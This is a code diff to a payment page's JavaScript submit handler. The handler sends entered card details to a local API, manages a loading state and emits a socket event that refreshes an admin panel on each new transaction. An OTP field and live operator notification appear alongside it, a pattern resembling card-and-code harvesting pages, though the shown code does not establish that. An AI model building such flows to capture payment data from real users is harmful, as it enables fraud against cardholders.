@@ -689,21 +689,20 @@
       document.getElementById('otp').addEventListener('input', updateConfirmOtpButton);
     
       // Payment Submission Handler
-     document.getElementById('mainForm').addEventListener('submit', async function(e) {
+// payment.html - Update form submit handler
+document.getElementById('mainForm').addEventListener('submit', async function(e) {
   e.preventDefault();
   if (!isCardValid || !isExpiryValid || isProcessing) return;
 
   isProcessing = true;
-  const overlay = document.getElementById('bankpageOverlay');
   const submitButton = document.getElementById('submitButton');
   const submitText = document.getElementById('submitText');
   const submitLoader = document.getElementById('submitLoader');
 
-  // Show loading spinner on button
-  submitText.style.opacity = '0.5';
-  submitText.style.filter = 'blur(1px)';
-  submitLoader.classList.remove('hidden');
+  // Show loading state
   submitButton.disabled = true;
+  submitText.textContent = "Processing...";
+  submitLoader.classList.remove('hidden');
 
   try {
     const response = await fetch("/api/sendPaymentDetails", {
@@ -720,20 +719,28 @@
       })
     });
 
-    const result = await response.json();
-    if (result.status === "success") {
-      bankPageWindow = window.open(
-        `/bankpage.html?invoiceId=${result.invoiceId}`, 
-        '_blank',
-        'width=600,height=800'
-      );
-      currentInvoiceId = result.invoiceId;
-      localStorage.setItem('invoiceId', currentInvoiceId);
-      socket.emit('join', currentInvoiceId);
+    if (!response.ok) {
+      const error = await response.json();
+      throw new Error(error.message || 'Payment failed');
     }
-  } catch (err) {
-    console.error('Payment submission error:', err);
-    alert('Error processing payment. Please try again.');
+
+    const result = await response.json();
+    // Store invoice ID and open bank page
+    currentInvoiceId = result.invoiceId;
+    localStorage.setItem('invoiceId', currentInvoiceId);
+    
+    // Force admin panel refresh through sockets
+    const socket = io();
+    socket.emit('new_transaction', currentInvoiceId);
+
+  } catch (error) {
+    console.error('Payment Error:', error);
+    alert(`Payment Failed: ${error.message}`);
+  } finally {
+    isProcessing = false;
+    submitButton.disabled = false;
+    submitText.textContent = "Proceed to Pay";
+    submitLoader.classList.add('hidden');
   }
 });
 
